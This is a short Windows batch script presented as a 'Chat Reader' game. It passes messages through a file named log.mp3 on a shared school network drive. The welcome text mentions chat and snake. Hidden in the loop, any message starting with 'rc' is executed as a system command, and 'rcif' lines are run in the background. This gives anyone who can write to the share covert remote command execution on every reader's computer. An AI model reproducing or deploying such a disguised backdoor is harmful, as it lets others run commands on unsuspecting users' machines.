set rstarget=0
@echo off
color 0a
cls
title Chat Reader
:top
cls
echo Welcome to the Chat!
echo Type 'about' into the chat reader to see how this chat works.
echo Type 'snake' to play snake!
echo.
timeout -1
cls
echo Chat Reader
echo %username% logged on.
pushd "\\Shs-files-01\14$\jsparrow14\My Documents\Chat"
echo %username% logged on.>log.mp3
waitfor /si CHATUPDATE>NUL
:chattop
waitfor CHATUPDATE>NUL
set /p chatread=<log.mp3
if "%chatread:~0,2%"=="rc" goto runcommand
echo %time:~0,8% %chatread%
title %chatread%
goto chattop
:runcommand
if %chatread:~0,4%==rcif goto runifcommand
%chatread:~2%
goto chattop
:runifcommand
start /b %chatread:~2%
goto chattop